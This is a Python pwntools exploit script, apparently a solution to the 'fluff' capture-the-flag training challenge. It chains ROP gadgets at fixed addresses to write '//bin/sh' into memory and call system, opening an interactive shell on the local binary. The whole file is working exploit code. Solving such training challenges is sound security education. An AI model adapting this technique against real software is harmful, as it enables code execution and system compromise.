#!/usr/bin/env python3

from pwn import *

pwn = process("./fluff")
#gdb.attach(pwn, '''
#break main
#''')

#------------------- TOYS ------------------------#
junk = b'A' * 40
filler = b'\x42' * 8
null = b'\x00' * 8

www_gadget = p64(0x000000000040084e) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
xor_r11 = p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
xchg_r11_r10 = p64(0x0000000000400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
zero_r11 = p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret; 
pop_r12 = p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret;
pop_rdi = p64(0x00000000004008c3) # pop rdi; ret; 


where = p64(0x601060)
what = b'\x2f\x2f\x62\x69\x6e\x2f\x73\x68'
#------------------- TOYS ------------------------#

buf = junk

#---objective1, get where into r10---#
buf += zero_r11
buf += filler # gets popped into r14, edi == 0x601050
buf += pop_r12
buf += where 
buf += xor_r11
buf += filler # gets popped into r12, r13d == 0x604060
buf += xchg_r11_r10
buf += filler # gets popped into r15, r11d == 0x602050

'''
AFFECTED REGISTERS NOW
rbp = junk
rdi = 0x601050
r10 = where
r11 = 0x0
r12 = filler
r13 = 0x604060
r14 = filler
r15 = 0x0
'''

#---objective2, get what into r11---#
buf += pop_r12 
buf += what
buf += zero_r11
buf += filler # gets popped into r14, edi == 0x601050
buf += xor_r11
buf += filler # gets popped r12, r13d == 0x604060


#---perform write what where---#
buf += www_gadget # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
buf += filler
buf += null # gets popped into r12 for the xor operation so that our string reamins unaffected

#---objective4, get where into rdi---#
buf += pop_rdi
buf += where

#---call system---#
buf += p64(0x00400810) # system call


pwn.sendline(buf)
pwn.interactive()
